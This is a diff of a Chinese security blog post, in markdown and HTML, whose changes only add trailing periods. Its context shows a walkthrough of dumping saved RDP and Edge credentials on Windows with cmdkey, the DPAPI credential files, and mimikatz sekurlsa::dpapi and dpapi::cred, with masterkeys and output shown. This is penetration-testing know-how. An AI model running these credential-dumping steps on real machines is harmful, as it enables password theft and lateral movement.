@@ -29,7 +29,7 @@ rdp 连接记录默认存储在注册表 `HKEY_CURRENT_USER\Software\Microsoft\T
 
 通过 `cmdkey /list` 可查看当前用户的所有凭据, 带有 `TERMSRV` 的为 rdp 连接凭据.
 
-另外比较有趣的是 edge 保存的密码也存储在这里
+另外比较有趣的是 edge 保存的密码也存储在这里.
 
 ```
 C:> cmdkey /list
@@ -52,7 +52,7 @@ C:> cmdkey /list
     本地机器持续时间
 ```
 
-3gstudent 大佬获取所有用户 rdp 连接记录的 powershell 脚本
+3gstudent 大佬获取所有用户 rdp 连接记录的 powershell 脚本.
 
 [List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)
 
@@ -65,7 +65,7 @@ dpapi 中进行数据加解密的操作需要用到 masterkey, 一个用户对�
 
 ## 导出 RDP 密码
 
-查看本机所有凭据
+查看本机所有凭据.
 
 ```
 C:\Users\exp10it>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
@@ -85,9 +85,9 @@ C:\Users\exp10it>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
                2 个目录 27,513,999,360 可用字节
 ```
 
-测试的 rdp 的凭据是这条 `3743512D9B4C0B672D0D1033FCBC7878`
+测试的 rdp 的凭据是这条 `3743512D9B4C0B672D0D1033FCBC7878`.
 
-mimikatz 导出凭据
+mimikatz 导出凭据.
 
 ```
 mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\3743512D9B4C0B672D0D1033FCBC7878
@@ -116,7 +116,7 @@ mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\374
   pbSign             : 3e9591523e57d626376e9fb77354d29faf91d83b0312a9205b27d81ac2fdeb69912e6a1a3f46be4bc023a6f0833440f92862b9169a20ca53540a83959bf9b145
 ```
 
-通过 sekurlsa 模块导出所有用户的 masterkey
+通过 sekurlsa 模块导出所有用户的 masterkey.
 
 ```
 mimikatz # sekurlsa::dpapi
@@ -137,7 +137,7 @@ SID               : S-1-5-21-470597163-2784945203-3219526951-1001
 ......
 ```
 
-再次执行命令, 指定 masterkey 参数
+再次执行命令, 指定 masterkey 参数.
 
 ```
 mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\3743512D9B4C0B672D0D1033FCBC7878 /masterkey:7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393
@@ -197,7 +197,7 @@ Decrypting Credential:
 
 <p>通过 <code>cmdkey /list</code> 可查看当前用户的所有凭据, 带有 <code>TERMSRV</code> 的为 rdp 连接凭据.</p>
 
-<p>另外比较有趣的是 edge 保存的密码也存储在这里</p>
+<p>另外比较有趣的是 edge 保存的密码也存储在这里.</p>
 
 <pre><code>C:&gt; cmdkey /list
 
@@ -219,7 +219,7 @@ Decrypting Credential:
     本地机器持续时间
 </code></pre>
 
-<p>3gstudent 大佬获取所有用户 rdp 连接记录的 powershell 脚本</p>
+<p>3gstudent 大佬获取所有用户 rdp 连接记录的 powershell 脚本.</p>
 
 <p><a href="https://github.com/3gstudent/List-RDP-Connections-History">List-RDP-Connections-History</a></p>
 
@@ -231,7 +231,7 @@ Decrypting Credential:
 
 <h2 id="rdp">导出 RDP 密码</h2>
 
-<p>查看本机所有凭据</p>
+<p>查看本机所有凭据.</p>
 
 <pre><code>C:\Users\exp10it&gt;dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
  驱动器 C 中的卷是 Windows
@@ -250,9 +250,9 @@ Decrypting Credential:
                2 个目录 27,513,999,360 可用字节
 </code></pre>
 
-<p>测试的 rdp 的凭据是这条 <code>3743512D9B4C0B672D0D1033FCBC7878</code></p>
+<p>测试的 rdp 的凭据是这条 <code>3743512D9B4C0B672D0D1033FCBC7878</code>.</p>
 
-<p>mimikatz 导出凭据</p>
+<p>mimikatz 导出凭据.</p>
 
 <pre><code>mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\3743512D9B4C0B672D0D1033FCBC7878
 **BLOB**
@@ -280,7 +280,7 @@ Decrypting Credential:
   pbSign             : 3e9591523e57d626376e9fb77354d29faf91d83b0312a9205b27d81ac2fdeb69912e6a1a3f46be4bc023a6f0833440f92862b9169a20ca53540a83959bf9b145
 </code></pre>
 
-<p>通过 sekurlsa 模块导出所有用户的 masterkey</p>
+<p>通过 sekurlsa 模块导出所有用户的 masterkey.</p>
 
 <pre><code>mimikatz # sekurlsa::dpapi
 
@@ -300,7 +300,7 @@ SID               : S-1-5-21-470597163-2784945203-3219526951-1001
 ......
 </code></pre>
 
-<p>再次执行命令, 指定 masterkey 参数</p>
+<p>再次执行命令, 指定 masterkey 参数.</p>
 
 <pre><code>mimikatz # dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\3743512D9B4C0B672D0D1033FCBC7878 /masterkey:7daaec86a9ff317da98d8fa955bd9112b2adfd864552d2e64066820c42daa8a37ba8cf0b9f35d99b0b5d3d3e7ff6bbfe0a0b5e710473fb3a3e7aee056f2b6393
 **BLOB**
